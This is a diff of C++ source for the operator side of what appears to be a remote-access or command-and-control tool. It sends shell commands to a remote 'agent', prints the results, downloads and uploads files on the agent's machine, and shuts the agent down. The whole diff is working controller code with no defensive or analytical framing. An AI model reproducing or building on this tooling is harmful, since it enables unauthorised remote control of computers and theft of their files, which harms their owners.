@@ -8,77 +8,137 @@ void Stager::OnConnect(Connection newConnection)
     newConnection.Recv(packet);
 
     uint32_t packetSize = packet.PacketSize();
+    std::cout << "[+] Current Directory: ";
 
     while (packet.GetPacketOffset() < packetSize)
         std::cout << packet.ExtractString();
+
+    std::cout << std::endl;
 }
 
 bool Stager::Logic(const std::string& cmd)
 {
-    Packet packet;
-
     if (cmd == "Quit")
-    {
         return false;
-    }
 
-    packet.InsertString(cmd);
-    if (not clientConn.Send(packet))
-    {
-        std::cerr << "Error at Send (command)" << std::endl;
-        return false;
-    }
+    if (cmd == "")
+        return true;
 
-    if (cmd.rfind("Download ", 0) == 0)
+    PacketType packetType = MapPacketType(cmd);
+    Packet     packet(packetType);
+        
+    // receive file
+    if (packetType == PacketType::Integers)
     {
-        if (not clientConn.RecvFile())
+        std::string filename = cmd.substr(cmd.find(' ') + 1);
+        packet.InsertString(filename);
+
+        // send packet with the file name we want to download
+        if (not clientConn.Send(packet))
+        {
+            std::cerr << "Error at Send (download pcket)." << std::endl;
+            return false;
+        }
+
+        // receive packet with filename and file size
+        if (not clientConn.Recv(packet))
+        {
+            std::cerr << "Error at Send (download pcket)." << std::endl;
+            return false;
+        }
+
+        // check for error
+        if (packet.GetPacketType() == PacketType::Invalid)
+        {
+            std::cout << "No such file or directory." << std::endl;
+            return true;
+        }
+                
+        filename = packet.ExtractString();
+        uint32_t filesize = packet.ExtractInt();
+
+        if (not clientConn.RecvFile(filename, filesize))
         {
             std::cerr << "Error at RecvFile." << std::endl;
             return false;
         }
+
+        // exit the function since we received the file
+        return true;
     }
 
-    else if (cmd.rfind("Upload ", 0) == 0)
+    // send file
+    else if (packetType == PacketType::Bytes)
     {
-        std::string filename = cmd.substr(cmd.find(" ") + 1);
+        // check if file exist, if not display error message
+        // send the file
+        std::string filename = cmd.substr(cmd.find(' ') + 1);
 
         if (std::filesystem::exists(filename))
         {
             if (not clientConn.SendFile(filename))
             {
-                std::cerr << "Error at Sendfile" << std::endl;
-                return false;
+                std::cerr << "Error at SendFile." << std::endl;
             }
         }
 
         else
         {
-            std::cout << "No such file or Directory." << "\n>> ";
-            return true;
-
+            std::cout << "No such file or directory." << std::endl;
         }
 
+        // exit the function since we sent the file or got an error
+        return true;
     }
+    
 
-    else
+    // send connectionClose packet to the agent and return
+    if (packetType == PacketType::ConnectionClose)
     {
-        if (not clientConn.Recv(packet))
+        if (not clientConn.Send(packet))
         {
-            std::cerr << "Error at Recv (command output)" << std::endl;
-            return false;
+            std::cerr << "Error at Send (ConnectionClose)." << std::endl;
         }
 
-        std::cout << packet.ExtractString().erase(0, cmd.size() + 1);
+        return true;
+    }
+        packet.InsertString(cmd);
+
+    // send packet since it is not send/recv file
+    if (not clientConn.Send(packet))
+    {
+        std::cerr << "Error at Send (ConnectionClose)." << std::endl;
     }
 
-    packet.Clear();
+    // now receive the response
     if (not clientConn.Recv(packet))
     {
-        std::cerr << "Error at Recv (pwd)" << std::endl;
-        return false;
+        std::cerr << "Error at Recv (agent response)." << std::endl;
     }
 
-    std::cout << '\n' << packet.ExtractString() << ">";
+    // print the output
+    std::cout << '\n' << packet.ExtractString();
 
 	return true;
+}
+
+PacketType Stager::MapPacketType(const std::string& cmd)
+{
+    std::string commandType = cmd.substr(0, cmd.find(' '));
+    std::string commandArgs = cmd.substr(cmd.find(' ') + 1);
+    
+    if (cmd == "agentdown")
+        return PacketType::ConnectionClose;
+
+    else if (commandType == "upload")
+        return PacketType::Bytes;
+
+    else if (commandType == "download")
+        return PacketType::Integers;
+
+    else if (commandType == "cd" and commandArgs != commandType) // ugly but works
+        return PacketType::Pwd;
+
+    else 
+        return PacketType::Text;
 }
